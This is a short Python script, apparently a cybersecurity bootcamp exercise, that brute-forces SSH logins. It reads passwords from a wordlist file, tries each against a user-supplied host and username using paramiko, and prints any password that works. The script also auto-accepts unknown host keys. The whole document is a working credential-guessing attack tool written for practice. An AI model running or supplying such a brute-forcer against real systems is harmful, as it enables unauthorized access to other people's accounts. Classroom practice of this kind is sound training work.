# OPS401D10  Ops Challenge 17
# 01/30/2024
# Dominique Bruso
# Purpose: practice python scripting 
# source: https://github.com/codefellows/seattle-cybersecurity-401d10/blob/main/class-17/challenges/DEMO.md

#!/usr/bin/env python3
# Shebang line to tell the system to execute this script with Python 3.

import paramiko  # Importing the paramiko library for SSH connections.
import getpass   # Importing getpass for password input.
import sys       # Importing sys for system-specific functions, like exit.

# Get input from the user for SSH server details.
host = input("Please provide an IP address to connect to: ")  # Asking for the SSH server's IP address.
user = input("Please provide a username: ")                   # Asking for the username.
input_file_path = input("Please provide the path to the password file: ")  # Asking for the path to the password file.

# Create an SSH client object.
ssh = paramiko.SSHClient()  # Creating a new SSHClient instance.
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Setting policy to automatically add the host key.

# Function to attempt SSH connection.
def ssh_connect(password, code=0):
    try:
        ssh.connect(host, port=22, username=user, password=password)  # Attempting to connect to SSH server.
        return 0  # Return 0 if connection is successful.
    except paramiko.AuthenticationException:
        return 1  # Return 1 if authentication fails.
    except paramiko.SSHException:
        return 2  # Return 2 for other SSH exceptions.
    finally:
        ssh.close()  # Closing the SSH connection in the end.

# Reading from the password file.
with open(input_file_path, "r") as input_file:  # Opening the password file.
    for line in input_file.readlines():  # Reading each line in the file.
        password = line.strip("\n")  # Stripping newline characters from the password.
        try:
            response = ssh_connect(password)  # Attempting to connect with the current password.

            if response == 0:
                print(f"[*] User: {user} [*] Pass Found: {password}")  # Printing the found password.
                sys.exit(0)  # Exiting the program if the password is found.
            elif response == 1:
                print("Login incorrect.")  # Indicating that the login attempt was incorrect.
            elif response == 2:
                print("Connection could not be established to address.")  # Indicating a connection issue.
        except Exception as e:
            print(f"An error occurred: {e}")  # Printing any other exceptions that occur.
            continue  # Continuing with the next password in case of an exception.

print("Password not found in the provided file.")  # Message if the password is not found in the file.
